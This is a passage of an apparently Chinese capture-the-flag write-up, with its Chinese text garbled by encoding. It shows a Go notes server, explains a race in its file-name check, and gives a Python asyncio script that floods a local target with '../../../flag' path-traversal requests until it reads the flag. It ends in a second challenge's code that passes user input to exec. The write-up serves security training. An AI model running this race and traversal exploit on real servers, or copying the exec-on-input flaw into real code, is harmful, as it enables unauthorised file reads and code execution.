</span></span><span class="line"><span class="cl">	<span class="nx">http</span><span class="p">.</span><span class="nf">HandleFunc</span><span class="p">(</span><span class="s">&#34;/write&#34;</span><span class="p">,</span> <span class="kd">func</span><span class="p">(</span><span class="nx">w</span> <span class="nx">http</span><span class="p">.</span><span class="nx">ResponseWriter</span><span class="p">,</span> <span class="nx">r</span> <span class="o">*</span><span class="nx">http</span><span class="p">.</span><span class="nx">Request</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="k">if</span> <span class="nx">r</span><span class="p">.</span><span class="nx">Method</span> <span class="o">!=</span> <span class="s">&#34;POST&#34;</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">			<span class="nf">renderError</span><span class="p">(</span><span class="nx">w</span><span class="p">,</span> <span class="s">&#34;æ–¹æ³•ä¸å…è®¸&#34;</span><span class="p">,</span> <span class="nx">http</span><span class="p">.</span><span class="nx">StatusMethodNotAllowed</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">			<span class="k">return</span>
</span></span><span class="line"><span class="cl">		<span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">		<span class="nx">name</span> <span class="o">:=</span> <span class="nx">r</span><span class="p">.</span><span class="nf">FormValue</span><span class="p">(</span><span class="s">&#34;name&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">		<span class="nx">content</span> <span class="o">:=</span> <span class="nx">r</span><span class="p">.</span><span class="nf">FormValue</span><span class="p">(</span><span class="s">&#34;content&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">		<span class="k">if</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nf">blackJack</span><span class="p">(</span><span class="nx">name</span><span class="p">);</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">			<span class="nf">renderError</span><span class="p">(</span><span class="nx">w</span><span class="p">,</span> <span class="nx">err</span><span class="p">.</span><span class="nf">Error</span><span class="p">(),</span> <span class="nx">http</span><span class="p">.</span><span class="nx">StatusBadRequest</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">			<span class="k">return</span>
</span></span><span class="line"><span class="cl">		<span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">		<span class="c1">// æ ¹æ®æ ¼å¼å‚æ•°å†³å®šæ–‡ä»¶æ‰©å±•å</span>
</span></span><span class="line"><span class="cl">		<span class="k">if</span> <span class="nx">r</span><span class="p">.</span><span class="nf">FormValue</span><span class="p">(</span><span class="s">&#34;format&#34;</span><span class="p">)</span> <span class="o">==</span> <span class="s">&#34;markdown&#34;</span> <span class="o">&amp;&amp;</span> <span class="p">!</span><span class="nx">strings</span><span class="p">.</span><span class="nf">HasSuffix</span><span class="p">(</span><span class="nx">name</span><span class="p">,</span> <span class="s">&#34;.md&#34;</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">			<span class="nx">name</span> <span class="o">+=</span> <span class="s">&#34;.md&#34;</span>
</span></span><span class="line"><span class="cl">		<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">			<span class="nx">name</span> <span class="o">+=</span> <span class="s">&#34;.txt&#34;</span>
</span></span><span class="line"><span class="cl">		<span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">		<span class="c1">// é™åˆ¶å†…å®¹å¤§å°</span>
</span></span><span class="line"><span class="cl">		<span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="nx">content</span><span class="p">)</span> <span class="p">&gt;</span> <span class="mi">10240</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">			<span class="nx">content</span> <span class="p">=</span> <span class="nx">content</span><span class="p">[:</span><span class="mi">10240</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">		<span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">		<span class="nx">err</span> <span class="o">:=</span> <span class="nx">os</span><span class="p">.</span><span class="nf">WriteFile</span><span class="p">(</span><span class="nx">filepath</span><span class="p">.</span><span class="nf">Join</span><span class="p">(</span><span class="s">&#34;notes&#34;</span><span class="p">,</span> <span class="nx">name</span><span class="p">),</span> <span class="p">[]</span><span class="nb">byte</span><span class="p">(</span><span class="nx">content</span><span class="p">),</span> <span class="mo">0600</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">		<span class="k">if</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">			<span class="nf">renderError</span><span class="p">(</span><span class="nx">w</span><span class="p">,</span> <span class="s">&#34;å†™å…¥æ–‡ä»¶å¤±è´¥&#34;</span><span class="p">,</span> <span class="nx">http</span><span class="p">.</span><span class="nx">StatusInternalServerError</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">			<span class="k">return</span>
</span></span><span class="line"><span class="cl">		<span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">		<span class="nx">http</span><span class="p">.</span><span class="nf">Redirect</span><span class="p">(</span><span class="nx">w</span><span class="p">,</span> <span class="nx">r</span><span class="p">,</span> <span class="s">&#34;/&#34;</span><span class="p">,</span> <span class="nx">http</span><span class="p">.</span><span class="nx">StatusSeeOther</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="p">})</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="c1">// åˆ é™¤ç¬”è®°è·¯ç”±</span>
</span></span><span class="line"><span class="cl">	<span class="nx">http</span><span class="p">.</span><span class="nf">HandleFunc</span><span class="p">(</span><span class="s">&#34;/delete&#34;</span><span class="p">,</span> <span class="kd">func</span><span class="p">(</span><span class="nx">w</span> <span class="nx">http</span><span class="p">.</span><span class="nx">ResponseWriter</span><span class="p">,</span> <span class="nx">r</span> <span class="o">*</span><span class="nx">http</span><span class="p">.</span><span class="nx">Request</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="nx">name</span> <span class="o">:=</span> <span class="nx">r</span><span class="p">.</span><span class="nx">URL</span><span class="p">.</span><span class="nf">Query</span><span class="p">().</span><span class="nf">Get</span><span class="p">(</span><span class="s">&#34;name&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">		<span class="k">if</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nf">blackJack</span><span class="p">(</span><span class="nx">name</span><span class="p">);</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">			<span class="nf">renderError</span><span class="p">(</span><span class="nx">w</span><span class="p">,</span> <span class="nx">err</span><span class="p">.</span><span class="nf">Error</span><span class="p">(),</span> <span class="nx">http</span><span class="p">.</span><span class="nx">StatusBadRequest</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">			<span class="k">return</span>
</span></span><span class="line"><span class="cl">		<span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">		<span class="nx">err</span> <span class="o">:=</span> <span class="nx">os</span><span class="p">.</span><span class="nf">Remove</span><span class="p">(</span><span class="nx">filepath</span><span class="p">.</span><span class="nf">Join</span><span class="p">(</span><span class="s">&#34;notes&#34;</span><span class="p">,</span> <span class="nx">name</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">		<span class="k">if</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">			<span class="nf">renderError</span><span class="p">(</span><span class="nx">w</span><span class="p">,</span> <span class="s">&#34;åˆ é™¤æ–‡ä»¶å¤±è´¥&#34;</span><span class="p">,</span> <span class="nx">http</span><span class="p">.</span><span class="nx">StatusInternalServerError</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">			<span class="k">return</span>
</span></span><span class="line"><span class="cl">		<span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">		<span class="nx">http</span><span class="p">.</span><span class="nf">Redirect</span><span class="p">(</span><span class="nx">w</span><span class="p">,</span> <span class="nx">r</span><span class="p">,</span> <span class="s">&#34;/&#34;</span><span class="p">,</span> <span class="nx">http</span><span class="p">.</span><span class="nx">StatusSeeOther</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="p">})</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="c1">// é™æ€æ–‡ä»¶è·¯ç”±</span>
</span></span><span class="line"><span class="cl">	<span class="nx">http</span><span class="p">.</span><span class="nf">Handle</span><span class="p">(</span><span class="s">&#34;/static/&#34;</span><span class="p">,</span> <span class="nx">http</span><span class="p">.</span><span class="nf">StripPrefix</span><span class="p">(</span><span class="s">&#34;/static/&#34;</span><span class="p">,</span> <span class="nx">http</span><span class="p">.</span><span class="nf">FileServer</span><span class="p">(</span><span class="nx">http</span><span class="p">.</span><span class="nf">Dir</span><span class="p">(</span><span class="s">&#34;static&#34;</span><span class="p">))))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="c1">// å¯åŠ¨æœåŠ¡å™¨</span>
</span></span><span class="line"><span class="cl">	<span class="nx">srv</span> <span class="o">:=</span> <span class="o">&amp;</span><span class="nx">http</span><span class="p">.</span><span class="nx">Server</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="nx">Addr</span><span class="p">:</span>         <span class="s">&#34;:9046&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">		<span class="nx">ReadTimeout</span><span class="p">:</span>  <span class="mi">10</span> <span class="o">*</span> <span class="nx">time</span><span class="p">.</span><span class="nx">Second</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">		<span class="nx">WriteTimeout</span><span class="p">:</span> <span class="mi">15</span> <span class="o">*</span> <span class="nx">time</span><span class="p">.</span><span class="nx">Second</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="nx">log</span><span class="p">.</span><span class="nf">Fatal</span><span class="p">(</span><span class="nx">srv</span><span class="p">.</span><span class="nf">ListenAndServe</span><span class="p">())</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>æ¼æ´ç‚¹æ˜¯</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">if safe = blackJack(name); safe / nil {
</span></span><span class="line"><span class="cl"> renderError(w, safe.Error(), http.StatusBadRequest)
</span></span><span class="line"><span class="cl"> return
</span></span><span class="line"><span class="cl">}
</span></span></code></pre></td></tr></table>
</div>
</div><p>ç¬¬ä¸€æ¬¡è¾“å…¥ä¸€ä¸ªä»»æ„çš„ name ï¼Œä½¿å¾— safe è¢«èµ‹å€¼ä¸º nil ï¼Œç„¶åç«‹åˆ»è¯»å–flagï¼Œæ­¤æ—¶err è¿˜ä¼šæ˜¯ nil</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">aiohttp</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">asyncio</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">time</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Solver</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">baseUrl</span><span class="p">):</span>  <span class="c1"># åˆå§‹åŒ–æ–¹æ³•ï¼Œè®¾ç½®åŸºæœ¬URLå’Œç›¸å…³å‚æ•°</span>
</span></span><span class="line"><span class="cl">        <span class="bp">self</span><span class="o">.</span><span class="n">baseUrl</span> <span class="o">=</span> <span class="n">baseUrl</span>
</span></span><span class="line"><span class="cl">        <span class="bp">self</span><span class="o">.</span><span class="n">READ_FILE_ENDPOINT</span> <span class="o">=</span> <span class="sa">f</span><span class="s1">&#39;</span><span class="si">{</span><span class="bp">self</span><span class="o">.</span><span class="n">baseUrl</span><span class="si">}</span><span class="s1">&#39;</span>  <span class="c1"># ç”¨äºè¯»å–æ–‡ä»¶çš„ç«¯ç‚¹</span>
</span></span><span class="line"><span class="cl">        <span class="bp">self</span><span class="o">.</span><span class="n">VALID_CHECK_PARAMETER</span> <span class="o">=</span> <span class="s1">&#39;/read?name=1&#39;</span>  <span class="c1"># æœ‰æ•ˆå‚æ•°ï¼Œç”¨äºæ­£å¸¸è¯·æ±‚</span>
</span></span><span class="line"><span class="cl">        <span class="bp">self</span><span class="o">.</span><span class="n">INVALID_CHECK_PARAMETER</span> <span class="o">=</span> <span class="s1">&#39;/read?name=../../../flag&#39;</span>
</span></span><span class="line"><span class="cl">        <span class="bp">self</span><span class="o">.</span><span class="n">RACE_CONDITION_JOBS</span> <span class="o">=</span> <span class="mi">100</span>  <span class="c1"># è®¾ç½®ç«æ€æ¡ä»¶çš„å¹¶å‘ä»»åŠ¡æ•°é‡</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">async</span> <span class="k">def</span> <span class="nf">raceValidationCheck</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">session</span><span class="p">,</span> <span class="n">parameter</span><span class="p">):</span>  <span class="c1"># å¼‚æ­¥æ–¹æ³•ï¼Œç”¨äºå‘é€GETè¯·æ±‚å¹¶è·å–å“åº”</span>
</span></span><span class="line"><span class="cl">        <span class="n">url</span> <span class="o">=</span> <span class="sa">f</span><span class="s1">&#39;</span><span class="si">{</span><span class="bp">self</span><span class="o">.</span><span class="n">READ_FILE_ENDPOINT</span><span class="si">}{</span><span class="n">parameter</span><span class="si">}</span><span class="s1">&#39;</span>  <span class="c1"># æ„é€ è¯·æ±‚URL</span>
</span></span><span class="line"><span class="cl">        <span class="k">async</span> <span class="k">with</span> <span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">)</span> <span class="k">as</span> <span class="n">response</span><span class="p">:</span>  <span class="c1"># ä½¿ç”¨å¼‚æ­¥ä¼šè¯å‘é€GETè¯·æ±‚</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="k">await</span> <span class="n">response</span><span class="o">.</span><span class="n">text</span><span class="p">()</span>  <span class="c1"># è¿”å›å“åº”æ–‡æœ¬</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">async</span> <span class="k">def</span> <span class="nf">raceCondition</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">session</span><span class="p">):</span>  <span class="c1"># åˆ›å»ºå¹¶è¡Œä»»åŠ¡ï¼Œæ¨¡æ‹Ÿç«æ€æ¡ä»¶</span>
</span></span><span class="line"><span class="cl">        <span class="n">tasks</span> <span class="o">=</span> <span class="nb">list</span><span class="p">()</span>  <span class="c1"># ç”¨äºå­˜å‚¨æ‰€æœ‰ä»»åŠ¡çš„åˆ—è¡¨</span>
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">RACE_CONDITION_JOBS</span><span class="p">):</span>  <span class="c1"># å¾ªç¯åˆ›å»ºæŒ‡å®šæ•°é‡çš„ä»»åŠ¡</span>
</span></span><span class="line"><span class="cl">            <span class="n">tasks</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">raceValidationCheck</span><span class="p">(</span><span class="n">session</span><span class="p">,</span> <span class="bp">self</span><span class="o">.</span><span class="n">VALID_CHECK_PARAMETER</span><span class="p">))</span>  <span class="c1"># æ·»åŠ æœ‰æ•ˆè¯·æ±‚ä»»åŠ¡</span>
</span></span><span class="line"><span class="cl">            <span class="n">tasks</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">raceValidationCheck</span><span class="p">(</span><span class="n">session</span><span class="p">,</span> <span class="bp">self</span><span class="o">.</span><span class="n">INVALID_CHECK_PARAMETER</span><span class="p">))</span>  <span class="c1"># æ·»åŠ æ— æ•ˆè¯·æ±‚ä»»åŠ¡</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="k">await</span> <span class="n">asyncio</span><span class="o">.</span><span class="n">gather</span><span class="p">(</span><span class="o">*</span><span class="n">tasks</span><span class="p">)</span>  <span class="c1"># å¹¶è¡Œæ‰§è¡Œæ‰€æœ‰ä»»åŠ¡å¹¶è¿”å›ç»“æœ</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">async</span> <span class="k">def</span> <span class="nf">solve</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>  <span class="c1"># ä¸»è§£å†³æ–¹æ³•ï¼Œå°è¯•è·å–flag</span>
</span></span><span class="line"><span class="cl">        <span class="k">async</span> <span class="k">with</span> <span class="n">aiohttp</span><span class="o">.</span><span class="n">ClientSession</span><span class="p">()</span> <span class="k">as</span> <span class="n">session</span><span class="p">:</span>  <span class="c1"># åˆ›å»ºå¼‚æ­¥HTTPå®¢æˆ·ç«¯ä¼šè¯</span>
</span></span><span class="line"><span class="cl">            <span class="n">attempts</span> <span class="o">=</span> <span class="mi">1</span>  <span class="c1"># åˆå§‹åŒ–å°è¯•æ¬¡æ•°</span>
</span></span><span class="line"><span class="cl">            <span class="n">finishedRaceConditionJobs</span> <span class="o">=</span> <span class="mi">0</span>  <span class="c1"># åˆå§‹åŒ–å®Œæˆçš„ä»»åŠ¡æ•°é‡</span>
</span></span><span class="line"><span class="cl">            <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>  <span class="c1"># æ— é™å¾ªç¯ï¼ŒæŒç»­å°è¯•</span>
</span></span><span class="line"><span class="cl">                <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;[*] Attempts: </span><span class="si">{</span><span class="n">attempts</span><span class="si">}</span><span class="s1"> - Finished race condition jobs: </span><span class="si">{</span><span class="n">finishedRaceConditionJobs</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>  <span class="c1"># æ‰“å°å½“å‰çŠ¶æ€</span>
</span></span><span class="line"><span class="cl">                <span class="n">results</span> <span class="o">=</span> <span class="k">await</span> <span class="bp">self</span><span class="o">.</span><span class="n">raceCondition</span><span class="p">(</span><span class="n">session</span><span class="p">)</span>  <span class="c1"># æ‰§è¡Œç«æ€æ¡ä»¶ä»»åŠ¡å¹¶è·å–ç»“æœ</span>
</span></span><span class="line"><span class="cl">                <span class="n">attempts</span> <span class="o">+=</span> <span class="mi">1</span>  <span class="c1"># å¢åŠ å°è¯•æ¬¡æ•°</span>
</span></span><span class="line"><span class="cl">                <span class="n">finishedRaceConditionJobs</span> <span class="o">+=</span> <span class="bp">self</span><span class="o">.</span><span class="n">RACE_CONDITION_JOBS</span>  <span class="c1"># æ›´æ–°å®Œæˆçš„ä»»åŠ¡æ•°é‡</span>
</span></span><span class="line"><span class="cl">                <span class="k">for</span> <span class="n">result</span> <span class="ow">in</span> <span class="n">results</span><span class="p">:</span>  <span class="c1"># æ£€æŸ¥æ¯ä¸ªå“åº”ç»“æœ</span>
</span></span><span class="line"><span class="cl">                    <span class="k">if</span> <span class="s1">&#39;TGCTF{&#39;</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">result</span><span class="p">:</span>  <span class="c1"># å¦‚æœç»“æœä¸­ä¸åŒ…å«flagæ ‡å¿—ï¼Œè·³è¿‡</span>
</span></span><span class="line"><span class="cl">                        <span class="k">continue</span>
</span></span><span class="line"><span class="cl">                    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">[+] We won the race window! Flag: </span><span class="si">{</span><span class="n">result</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>  <span class="c1"># æ‰“å°è·å–åˆ°çš„flag</span>
</span></span><span class="line"><span class="cl">                    <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>  <span class="c1"># æˆåŠŸåé€€å‡ºç¨‹åº</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>  <span class="c1"># ç¨‹åºå…¥å£</span>
</span></span><span class="line"><span class="cl">    <span class="n">baseUrl</span> <span class="o">=</span> <span class="s1">&#39;http://127.0.0.1:52270/&#39;</span>  <span class="c1"># ç›®æ ‡æœåŠ¡å™¨çš„URLï¼ˆå·²ä¿®æ­£æ‹¼å†™é”™è¯¯ï¼‰</span>
</span></span><span class="line"><span class="cl">    <span class="n">solver</span> <span class="o">=</span> <span class="n">Solver</span><span class="p">(</span><span class="n">baseUrl</span><span class="p">)</span>  <span class="c1"># åˆ›å»ºSolverå®ä¾‹</span>
</span></span><span class="line"><span class="cl">    <span class="n">asyncio</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">solver</span><span class="o">.</span><span class="n">solve</span><span class="p">())</span>  <span class="c1"># è¿è¡Œå¼‚æ­¥è§£å†³æ–¹æ³•</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="ç†Ÿæ‚‰çš„é…æ–¹ç†Ÿæ‚‰çš„å‘³é“"><strong>ç†Ÿæ‚‰çš„é…æ–¹ï¼Œç†Ÿæ‚‰çš„å‘³é“</strong>
</h3><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span><span class="lnt">68
</span><span class="lnt">69
</span><span class="lnt">70
</span><span class="lnt">71
</span><span class="lnt">72
</span><span class="lnt">73
</span><span class="lnt">74
</span><span class="lnt">75
</span><span class="lnt">76
</span><span class="lnt">77
</span><span class="lnt">78
</span><span class="lnt">79
</span><span class="lnt">80
</span><span class="lnt">81
</span><span class="lnt">82
</span><span class="lnt">83
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pyramid.config</span> <span class="kn">import</span> <span class="n">Configurator</span>  <span class="c1"># å¯¼å…¥ Pyramid é…ç½®ç±»</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pyramid.request</span> <span class="kn">import</span> <span class="n">Request</span>  <span class="c1"># å¯¼å…¥ Pyramid è¯·æ±‚ç±»</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pyramid.response</span> <span class="kn">import</span> <span class="n">Response</span>  <span class="c1"># å¯¼å…¥ Pyramid å“åº”ç±»</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pyramid.view</span> <span class="kn">import</span> <span class="n">view_config</span>  <span class="c1"># å¯¼å…¥ Pyramid è§†å›¾é…ç½®è£…é¥°å™¨</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">wsgiref.simple_server</span> <span class="kn">import</span> <span class="n">make_server</span>  <span class="c1"># å¯¼å…¥ç”¨äºåˆ›å»ºç®€å• WSGI æœåŠ¡å™¨çš„å‡½æ•°</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pyramid.events</span> <span class="kn">import</span> <span class="n">NewResponse</span>  <span class="c1"># å¯¼å…¥ Pyramid æ–°å“åº”äº‹ä»¶ç±»</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">re</span>  <span class="c1"># å¯¼å…¥æ­£åˆ™è¡¨è¾¾å¼æ¨¡å—</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">jinja2</span> <span class="kn">import</span> <span class="n">Environment</span><span class="p">,</span> <span class="n">BaseLoader</span>  <span class="c1"># å¯¼å…¥ Jinja2 æ¨¡æ¿å¼•æ“ç›¸å…³ç±»</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># å®šä¹‰ä¸€ä¸ªå…¨å±€å­—å…¸ï¼Œç”¨äºé™åˆ¶ eval å‡½æ•°çš„æ‰§è¡Œç¯å¢ƒï¼Œé˜²æ­¢æ‰§è¡Œæ¶æ„ä»£ç </span>
</span></span><span class="line"><span class="cl"><span class="n">eval_globals</span> <span class="o">=</span> <span class="p">{</span>  
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;__builtins__&#39;</span><span class="p">:</span> <span class="p">{},</span>  <span class="c1"># ç¦ç”¨æ‰€æœ‰å†…ç½®å‡½æ•°</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;__import__&#39;</span><span class="p">:</span> <span class="kc">None</span>  <span class="c1"># ç¦æ­¢åŠ¨æ€å¯¼å…¥</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># å®šä¹‰ä¸€ä¸ªå‡½æ•°ï¼Œç”¨äºæ£€æŸ¥ç”¨æˆ·è¾“å…¥çš„è¡¨è¾¾å¼æ˜¯å¦ç¬¦åˆè¦æ±‚</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">checkExpr</span><span class="p">(</span><span class="n">expr_input</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># ä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼å°†è¡¨è¾¾å¼æŒ‰è¿ç®—ç¬¦åˆ†å‰²ä¸ºå¤šä¸ªéƒ¨åˆ†</span>
</span></span><span class="line"><span class="cl">    <span class="n">expr</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="sa">r</span><span class="s2">&#34;[-+*/]&#34;</span><span class="p">,</span> <span class="n">expr_input</span><span class="p">)</span>  
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">exec</span><span class="p">(</span><span class="n">expr_input</span><span class="p">))</span>  <span class="c1"># æ‰§è¡Œè¡¨è¾¾å¼ï¼ˆæ­¤å¤„å¯èƒ½å­˜åœ¨å®‰å…¨éšæ‚£ï¼‰</span>
</span></span><span class="line"><span class="cl">
